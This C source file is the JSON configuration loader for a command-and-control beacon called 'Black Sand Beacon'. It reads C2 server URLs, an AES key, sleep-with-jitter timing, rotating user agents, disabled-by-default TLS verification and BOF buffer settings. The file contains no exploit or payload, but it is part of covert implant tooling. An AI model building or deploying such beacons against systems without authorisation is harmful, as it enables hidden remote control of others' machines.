/*
 * config.c - JSON config loader for Black Sand Beacon.
 *
 * Self-contained: no libc JSON dependency, only stdio/stdlib/string.
 * Parses the schema documented in include/config.h.
 *
 * The parser is intentionally simple: it walks the JSON looking
 * for top-level keys ("c2", "crypto", "timing", "network", "bof")
 * and reads the string / integer / boolean / array values
 * declared in the schema. Unknown keys are skipped. Missing
 * sections fall back to safe defaults.
 */
#define _POSIX_C_SOURCE 200809L
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#include <unistd.h>
#include <limits.h>

/* --- file slurper --- */
static char *slurp(const char *path, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long n = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (n < 0) { fclose(f); return NULL; }
    char *buf = (char *)malloc((size_t)n + 1);
    if (!buf) { fclose(f); return NULL; }
    if (fread(buf, 1, (size_t)n, f) != (size_t)n) { fclose(f); free(buf); return NULL; }
    buf[n] = '\0';
    fclose(f);
    *out_len = (size_t)n;
    return buf;
}

/* --- lexer-style cursor helpers --- */
static const char *skip_ws(const char *p, const char *end) {
    while (p < end && isspace((unsigned char)*p)) p++;
    return p;
}

/* Read a JSON string starting at *pp (which must point at ").
 * On success, write the unescaped string into out (NUL terminated)
 * and advance *pp past the closing quote. */
static int read_string(const char **pp, const char *end, char *out, size_t outsz) {
    const char *p = skip_ws(*pp, end);
    if (p >= end || *p != '"') return 0;
    p++;
    size_t i = 0;
    while (p < end && *p != '"') {
        char ch = *p++;
        if (ch == '\\' && p < end) {
            char esc = *p++;
            switch (esc) {
                case 'n': ch = '\n'; break;
                case 't': ch = '\t'; break;
                case 'r': ch = '\r'; break;
                case '"': ch = '"'; break;
                case '\\': ch = '\\'; break;
                default: ch = esc; break;
            }
        }
        if (i + 1 < outsz) out[i++] = ch;
    }
    if (p >= end) return 0;
    p++;        /* closing quote */
    if (outsz) out[i < outsz ? i : outsz - 1] = '\0';
    *pp = p;
    return 1;
}

static int read_int(const char **pp, const char *end, int *out) {
    const char *p = skip_ws(*pp, end);
    if (p >= end) return 0;
    int neg = 0;
    if (*p == '-') { neg = 1; p++; }
    if (p >= end || !isdigit((unsigned char)*p)) return 0;
    long v = 0;
    while (p < end && isdigit((unsigned char)*p)) {
        v = v * 10 + (*p - '0');
        p++;
    }
    *out = (int)(neg ? -v : v);
    *pp = p;
    return 1;
}

static int read_bool(const char **pp, const char *end, int *out) {
    const char *p = skip_ws(*pp, end);
    if ((end - p) >= 4 && !memcmp(p, "true", 4)) { *out = 1; *pp = p + 4; return 1; }
    if ((end - p) >= 5 && !memcmp(p, "false", 5)) { *out = 0; *pp = p + 5; return 1; }
    return 0;
}

/* Expect the literal byte c. */
static int expect(const char **pp, const char *end, char c) {
    const char *p = skip_ws(*pp, end);
    if (p >= end || *p != c) return 0;
    *pp = p + 1;
    return 1;
}

/* Find the byte position of the matching closing brace for the
 * opening { at *pp. Honors string and escape rules. */
static const char *find_matching_brace(const char *p, const char *end) {
    if (p >= end || *p != '{') return NULL;
    int depth = 0;
    while (p < end) {
        char c = *p;
        if (c == '"') {
            p++;
            while (p < end && *p != '"') {
                if (*p == '\\' && p + 1 < end) p++;
                p++;
            }
            if (p < end) p++;
            continue;
        }
        if (c == '{') depth++;
        else if (c == '}') { depth--; if (depth == 0) return p; }
        p++;
    }
    return NULL;
}

/* Skip the next value at p (string, number, bool, null, object, array).
 * Returns the position just past the value, or NULL on error. */
static const char *skip_value(const char *p, const char *end) {
    p = skip_ws(p, end);
    if (p >= end) return NULL;
    char c = *p;
    if (c == '"') {
        p++;
        while (p < end && *p != '"') {
            if (*p == '\\' && p + 1 < end) p++;
            p++;
        }
        if (p < end) p++;
        return p;
    }
    if (c == '{') return find_matching_brace(p, end) + 1;
    if (c == '[') {
        int depth = 0;
        while (p < end) {
            char ch = *p;
            if (ch == '"') {
                p++;
                while (p < end && *p != '"') {
                    if (*p == '\\' && p + 1 < end) p++;
                    p++;
                }
                if (p < end) p++;
                continue;
            }
            if (ch == '[') depth++;
            else if (ch == ']') { depth--; if (depth == 0) return p + 1; }
            p++;
        }
        return NULL;
    }
    if (c == 't') return p + 4;
    if (c == 'f') return p + 5;
    if (c == 'n') return p + 4;
    /* number */
    while (p < end && (*p == '-' || isdigit((unsigned char)*p) || *p == '.' || *p == 'e' || *p == 'E' || *p == '+')) p++;
    return p;
}

/* --- hex decode --- */
static int hex_to_bytes(const char *hex, uint8_t *out, size_t outlen) {
    size_t hlen = strlen(hex);
    if (hlen != outlen * 2) return -1;
    for (size_t i = 0; i < outlen; i++) {
        unsigned int byte;
        if (sscanf(hex + i * 2, "%2x", &byte) != 1) return -1;
        out[i] = (uint8_t)byte;
    }
    return 0;
}

/* --- per-section parsers --- */
static void parse_c2(const char *p, const char *end, bsb_config_t *cfg) {
    while (p < end) {
        p = skip_ws(p, end);
        if (p >= end || *p == '}') return;
        char key[64];
        if (!read_string(&p, end, key, sizeof(key))) return;
        if (!expect(&p, end, ':')) return;
        if (!strcmp(key, "url")) {
            if (!read_string(&p, end, cfg->c2.url, sizeof(cfg->c2.url))) return;
        } else if (!strcmp(key, "uri")) {
            if (!read_string(&p, end, cfg->c2.uri, sizeof(cfg->c2.uri))) return;
        } else if (!strcmp(key, "client_id")) {
            if (!read_string(&p, end, cfg->c2.client_id, sizeof(cfg->c2.client_id))) return;
        } else if (!strcmp(key, "report_uri")) {
            if (!read_string(&p, end, cfg->c2.report_uri, sizeof(cfg->c2.report_uri))) return;
        } else {
            p = skip_value(p, end); if (!p) return;
        }
        p = skip_ws(p, end);
        if (p < end && *p == ',') p++;
    }
}

static void parse_crypto(const char *p, const char *end, bsb_config_t *cfg) {
    char hex[BSB_AES_KEY_HEX_LEN + 4] = {0};
    while (p < end) {
        p = skip_ws(p, end);
        if (p >= end || *p == '}') break;
        char key[64];
        if (!read_string(&p, end, key, sizeof(key))) break;
        if (!expect(&p, end, ':')) break;
        if (!strcmp(key, "aes_key_hex")) {
            if (!read_string(&p, end, hex, sizeof(hex))) break;
        } else if (!strcmp(key, "mode")) {
            if (!read_string(&p, end, cfg->crypto.mode, sizeof(cfg->crypto.mode))) break;
        } else {
            p = skip_value(p, end); if (!p) break;
        }
        p = skip_ws(p, end);
        if (p < end && *p == ',') p++;
    }
    hex_to_bytes(hex, cfg->crypto.key, BSB_AES_KEY_BYTES);
}

static void parse_timing(const char *p, const char *end, bsb_config_t *cfg) {
    while (p < end) {
        p = skip_ws(p, end);
        if (p >= end || *p == '}') return;
        char key[64];
        if (!read_string(&p, end, key, sizeof(key))) return;
        if (!expect(&p, end, ':')) return;
        if (!strcmp(key, "sleep_seconds")) {
            if (!read_int(&p, end, &cfg->timing.sleep_seconds)) return;
        } else if (!strcmp(key, "jitter_percent")) {
            if (!read_int(&p, end, &cfg->timing.jitter_percent)) return;
        } else if (!strcmp(key, "curl_timeout_seconds")) {
            if (!read_int(&p, end, &cfg->timing.curl_timeout_seconds)) return;
        } else if (!strcmp(key, "curl_connect_timeout_seconds")) {
            if (!read_int(&p, end, &cfg->timing.curl_connect_timeout_seconds)) return;
        } else {
            p = skip_value(p, end); if (!p) return;
        }
        p = skip_ws(p, end);
        if (p < end && *p == ',') p++;
    }
}

static void parse_network(const char *p, const char *end, bsb_config_t *cfg) {
    while (p < end) {
        p = skip_ws(p, end);
        if (p >= end || *p == '}') return;
        char key[64];
        if (!read_string(&p, end, key, sizeof(key))) return;
        if (!expect(&p, end, ':')) return;
        if (!strcmp(key, "user_agents")) {
            if (!expect(&p, end, '[')) return;
            cfg->network.count = 0;
            while (1) {
                p = skip_ws(p, end);
                if (p >= end) return;
                if (*p == ']') { p++; break; }
                if (cfg->network.count < BSB_MAX_USER_AGENTS) {
                    if (!read_string(&p, end,
                                     cfg->network.user_agents[cfg->network.count],
                                     BSB_USER_AGENT_LEN)) return;
                    cfg->network.count++;
                } else {
                    char tmp[BSB_USER_AGENT_LEN];
                    if (!read_string(&p, end, tmp, sizeof(tmp))) return;
                }
                p = skip_ws(p, end);
                if (p < end && *p == ',') p++;
            }
        } else if (!strcmp(key, "verify_tls")) {
            if (!read_bool(&p, end, &cfg->network.verify_tls)) return;
        } else {
            p = skip_value(p, end); if (!p) return;
        }
        p = skip_ws(p, end);
        if (p < end && *p == ',') p++;
    }
}

static void parse_bof(const char *p, const char *end, bsb_config_t *cfg) {
    while (p < end) {
        p = skip_ws(p, end);
        if (p >= end || *p == '}') return;
        char key[64];
        if (!read_string(&p, end, key, sizeof(key))) return;
        if (!expect(&p, end, ':')) return;
        if (!strcmp(key, "download_chunk_size")) {
            if (!read_int(&p, end, &cfg->bof.download_chunk_size)) return;
        } else if (!strcmp(key, "output_buffer_size")) {
            if (!read_int(&p, end, &cfg->bof.output_buffer_size)) return;
        } else {
            p = skip_value(p, end); if (!p) return;
        }
        p = skip_ws(p, end);
        if (p < end && *p == ',') p++;
    }
}

static void parse_backoff(const char *p, const char *end, bsb_config_t *cfg) {
    while (p < end) {
        p = skip_ws(p, end);
        if (p >= end || *p == '}') return;
        char key[64];
        if (!read_string(&p, end, key, sizeof(key))) return;
        if (!expect(&p, end, ':')) return;
        if (!strcmp(key, "base_seconds")) {
            if (!read_int(&p, end, &cfg->backoff.base_seconds)) return;
        } else if (!strcmp(key, "max_seconds")) {
            if (!read_int(&p, end, &cfg->backoff.max_seconds)) return;
        } else {
            p = skip_value(p, end); if (!p) return;
        }
        p = skip_ws(p, end);
        if (p < end && *p == ',') p++;
    }
}

/* --- main load --- */
int bsb_config_load(const char *path, bsb_config_t *cfg, char *err, size_t errlen) {
    if (err && errlen) err[0] = '\0';
    memset(cfg, 0, sizeof(*cfg));
    snprintf(cfg->path, sizeof(cfg->path), "%s", path);

    size_t n = 0;
    char *buf = slurp(path, &n);
    if (!buf) {
        if (err && errlen) snprintf(err, errlen, "cannot open %s", path);
        return -1;
    }
    const char *p = buf;
    const char *end = buf + n;

    /* Defaults. */
    cfg->timing.sleep_seconds = 6;
    cfg->timing.jitter_percent = 20;
    cfg->timing.curl_timeout_seconds = 10;
    cfg->timing.curl_connect_timeout_seconds = 5;
    cfg->bof.download_chunk_size = 4096;
    cfg->bof.output_buffer_size = 65536;
    cfg->backoff.base_seconds = 6;
    cfg->backoff.max_seconds = 300;
    cfg->network.verify_tls = 0;
    cfg->network.count = 0;
    snprintf(cfg->crypto.mode, sizeof(cfg->crypto.mode), "cfb");
    /* c2.* defaults must match the C2 server's defaults so a
     * missing or partial config.json still produces a working
     * beacon <-> server pair. If you change these, change the
     * matching defaults in c2/server.py. */
    snprintf(cfg->c2.url, sizeof(cfg->c2.url), "http://127.0.0.1:7070");
    snprintf(cfg->c2.uri, sizeof(cfg->c2.uri), "/api/poll/");
    snprintf(cfg->c2.client_id, sizeof(cfg->c2.client_id), "linux");
    snprintf(cfg->c2.report_uri, sizeof(cfg->c2.report_uri), BSB_REPORT_URI_DEFAULT);

    if (!expect(&p, end, '{')) {
        if (err && errlen) snprintf(err, errlen, "expected { at top of file");
        free(buf); return -1;
    }

    while (1) {
        p = skip_ws(p, end);
        if (p >= end) break;
        if (*p == '}') break;
        char key[64];
        if (!read_string(&p, end, key, sizeof(key))) {
            if (err && errlen) snprintf(err, errlen, "expected section key");
            free(buf); return -1;
        }
        if (!expect(&p, end, ':')) {
            if (err && errlen) snprintf(err, errlen, "expected ':' after key %s", key);
            free(buf); return -1;
        }
        p = skip_ws(p, end);
        if (p >= end || *p != '{') {
            if (err && errlen) snprintf(err, errlen, "expected object after key %s", key);
            free(buf); return -1;
        }
        const char *close = find_matching_brace(p, end);
        if (!close) {
            if (err && errlen) snprintf(err, errlen, "unterminated object for %s", key);
            free(buf); return -1;
        }
        const char *section_start = p + 1;
        const char *section_end = close;
        if      (!strcmp(key, "c2"))     parse_c2(section_start, section_end, cfg);
        else if (!strcmp(key, "crypto")) {
            parse_crypto(section_start, section_end, cfg);
            /* validate the AES key was actually parsed */
            uint8_t zeros[BSB_AES_KEY_BYTES] = {0};
            if (!memcmp(cfg->crypto.key, zeros, BSB_AES_KEY_BYTES)) {
                if (err && errlen) snprintf(err, errlen, "crypto.aes_key_hex missing or invalid");
                free(buf); return -1;
            }
        }
        else if (!strcmp(key, "timing")) parse_timing(section_start, section_end, cfg);
        else if (!strcmp(key, "network"))parse_network(section_start, section_end, cfg);
        else if (!strcmp(key, "bof"))    parse_bof(section_start, section_end, cfg);
        else if (!strcmp(key, "backoff")) parse_backoff(section_start, section_end, cfg);
        p = close + 1;
        p = skip_ws(p, end);
        if (p < end && *p == ',') p++;
    }

    free(buf);
    return 0;
}

/* Return the directory the running binary lives in, or NULL if
 * we cannot resolve it (e.g. on platforms without /proc/self/exe).
 * The returned buffer is statically sized; the caller copies if
 * it needs to keep the value past subsequent calls. */
static const char *binary_dir(char *out, size_t outsz) {
#ifdef __linux__
    char self[PATH_MAX];
    ssize_t n = readlink("/proc/self/exe", self, sizeof(self) - 1);
    if (n <= 0) return NULL;
    self[n] = '\0';
    /* Strip the basename, keep the directory. */
    char *slash = strrchr(self, '/');
    if (!slash) return NULL;
    *slash = '\0';
    snprintf(out, outsz, "%s", self);
    return out;
#else
    (void)out; (void)outsz;
    return NULL;
#endif
}

int bsb_config_load_default(bsb_config_t *cfg, char *err, size_t errlen) {
    /* Search order:
     *   1. $BSB_CONFIG (operator override)
     *   2. <dir-of-binary>/config.json   (works regardless of CWD)
     *   3. config/config.json           (legacy: relative to CWD)
     *
     * The first one that opens is used. If all three fail, we
     * report the path that was tried last along with the env var
     * name so the operator can fix it. */
    const char *env = getenv(BSB_CONFIG_PATH_ENV);
    if (env && *env) {
        int r = bsb_config_load(env, cfg, err, errlen);
        if (r == 0) return 0;
        return r;
    }

    char binbuf[PATH_MAX];
    if (binary_dir(binbuf, sizeof(binbuf))) {
        char candidate[PATH_MAX + 32];   /* binbuf + "/config.json" + slack */
        snprintf(candidate, sizeof(candidate), "%s/config.json", binbuf);
        if (access(candidate, R_OK) == 0) {
            return bsb_config_load(candidate, cfg, err, errlen);
        }
    }

    return bsb_config_load(BSB_CONFIG_PATH_DEFAULT, cfg, err, errlen);
}

int bsb_config_sleep_seconds(const bsb_config_t *cfg) {
    if (!cfg) return 6;
    int base = cfg->timing.sleep_seconds;
    if (cfg->timing.jitter_percent <= 0) return base;
    int span = (base * cfg->timing.jitter_percent) / 100;
    if (span <= 0) return base;
    static int seeded = 0;
    if (!seeded) { srand((unsigned)time(NULL)); seeded = 1; }
    int delta = (rand() % (2 * span + 1)) - span;
    int v = base + delta;
    return v < 1 ? 1 : v;
}
